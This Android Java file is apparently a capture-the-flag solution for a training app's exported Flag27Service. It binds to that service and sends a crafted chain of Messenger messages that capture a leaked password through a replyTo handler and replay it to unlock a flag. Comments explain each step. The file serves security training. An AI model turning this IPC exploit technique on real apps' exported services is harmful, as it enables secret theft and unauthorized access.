package com.example.proofofcontent;


import android.content.ComponentName;

import android.content.Context;

import android.content.Intent;

import android.content.ServiceConnection;

import android.os.Bundle;

import android.os.Handler;

import android.os.IBinder;

import android.os.Looper;

import android.os.Message;

import android.os.Messenger;

import android.os.RemoteException;

import android.util.Log;

import android.view.View;

import android.widget.Button;

import android.widget.TextView;

import android.net.Uri;


import androidx.activity.EdgeToEdge;

import androidx.appcompat.app.AppCompatActivity;

import androidx.core.graphics.Insets;

import androidx.core.view.ViewCompat;

import androidx.core.view.WindowInsetsCompat;


public class MainActivity extends AppCompatActivity {

    private final ServiceConnection serviceConnection = new ServiceConnection() {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {

            Messenger serviceMessenger = new Messenger(service);

            Message msg1 = Message.obtain(null, 1);
            Bundle b1 = new Bundle();
            b1.putString("echo", "give flag");
            msg1.setData(b1);

            // first message will set the this.echo() variable in the app to be give flag to be used later.
            try { serviceMessenger.send(msg1); }
            catch (RemoteException e) { e.printStackTrace(); }

            Message msg2 = Message.obtain(null, 2);

            // this line is crucial to set the msg2.obj to not be null, as it has to be != null to pass the conditional
            msg2.obj = new Message();

            // replyTo to receive the password the app is supposed to send when msg.what = 2
            msg2.replyTo = new Messenger(new Handler(Looper.getMainLooper()) {
                @Override
                public void handleMessage(Message reply) {

                    // get the data from the app reply expected
                    String password = reply.getData().getString("password");
                    Log.i(null, "Password received: " + password);

                    if (password == null) {
                        return;
                    }
                    Message msg3 = Message.obtain(null, 3);
                    Bundle b3 = new Bundle();
                    // put the password received in the password block of the bundle
                    b3.putString("password", password);
                    msg3.setData(b3);

                    msg3.replyTo = new Messenger(new Handler(Looper.getMainLooper()));

                    // sends data to the app to capture the flag and start the flag27 activity
                    try { serviceMessenger.send(msg3); }
                    catch (RemoteException e) { e.printStackTrace(); }
                }
            });
            try { serviceMessenger.send(msg2); }
            catch (RemoteException e) { e.printStackTrace(); }
        }


        @Override

        public void onServiceDisconnected(ComponentName name) {


        }

    };


    @Override

    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        EdgeToEdge.enable(this);

        setContentView(R.layout.activity_main);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {

            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());

            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);

            return insets;

        });


        TextView hometext = findViewById(R.id.home_text);

        hometext.setText("Hello world!");


        Button homeButton = findViewById(R.id.home_button);

        homeButton.setOnClickListener(new View.OnClickListener(){

            @Override

            public void onClick(View v){

                Intent intent = new Intent ();

                intent.setClassName("io.hextree.attacksurface",

                        "io.hextree.attacksurface.services.Flag27Service");

                bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);

            }

        });

    }

}

